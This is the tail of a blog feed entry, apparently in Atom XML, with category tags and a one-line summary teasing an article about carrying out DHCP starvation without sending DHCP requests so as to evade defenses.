+</blockquote>]]></content><author><name></name></author><category term="advanced" /><category term="application" /><category term="cybersecurity" /><category term="networking" /><category term="dhcp" /><category term="featured" /><summary type="html"><![CDATA[Most defense systems filter out repeated DHCP requests. What if you could perform DHCP starvation without sending a DCHP request?]]></summary></entry></feed>
